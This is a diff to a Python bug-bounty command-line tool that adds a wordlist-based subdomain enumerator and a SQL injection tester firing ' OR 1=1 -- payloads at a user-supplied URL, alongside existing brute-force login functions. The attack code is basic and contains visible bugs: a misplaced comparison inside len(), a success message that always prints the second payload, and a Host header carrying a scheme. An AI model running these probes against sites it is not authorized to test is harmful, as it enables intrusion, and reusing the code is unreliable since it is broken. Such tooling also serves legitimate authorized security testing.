@@ -4,6 +4,7 @@ import random
 import base64
 import hashlib
 import json
+
 def bug_bundy():
     print("\n")
     print(" ██████  ██    ██  ██████      ██████   ██████  ██    ██ ███    ██ ████████ ██    ██ ")
@@ -13,6 +14,23 @@ def bug_bundy():
     print(" ██████   ██████   ██████      ██████   ██████   ██████  ██   ████    ██       ██    ")
     print("\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t by Tom Thomas")
     print("\n")
+def subdomains():
+    url=input("Enter the URL without http:// or https:// ")
+    subfile=input("Enter the path of wordlist ")
+    fd=open(subfile,"r")
+    subs=fd.read()
+    subdomain=list(subs.split("\n"))
+    for i in subdomain:
+        url2="https://{}.{}".format(i,url)
+        header2={
+            "Host":"https://{}.{}".format(i,url)
+        }
+        try:
+            r = requests.get(url2,headers=header2)
+            if r.status_code!=404 and len(r.text>0):
+                print(url2)
+        except:
+            pass
 
 def bruteforce_via_different_responses(usernames, passwords, url):
     username = None
@@ -205,15 +223,47 @@ def Broken_Authentication():
             two_FA_broken_logic(url)
         else:
             break
+def SQl_injection_retrieval_of_hidden_data(url):
+    OR = ["' OR 1=1 -- ",
+                  "' OR '1'='1 -- "
+                  ]
+    print("Trying Error Based Injection with OR Payloads")
+    for i in range(0, len(OR)):
+        r = requests.get(url + OR[i])
+        if (r.status_code == 200):
+            print("{} worked".format(url + OR[1]))
+def SQL_injection():
+    while True:
+
+        print("\n")
+        print("Options:")
+        print("\n")
+        print("1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data")
+        print("9. Back")
+        print("\n")
+        option = int(input("Select an option: "))
+        print("\n")
+        if option ==9:
+            break
+        elif option == 1:
+            url = input("Enter a URL: ")
+            SQl_injection_retrieval_of_hidden_data(url)
+
 def main():
     bug_bundy()
     while True:
         print("Options:")
-        print("1.  Broken Authentication")
-        print("10. Exit")
+        print("1.  Subdomain")
+        print("2.  Broken Authentication")
+        print("3.  SQL injection")
+        print("11. Exit")
         option = int(input("Select an option: "))
         if option == 1:
+            subdomains()
+        elif option == 2:
             Broken_Authentication()
+        elif option == 3:
+            SQL_injection()
         else:
             break
 if __name__ == "__main__":
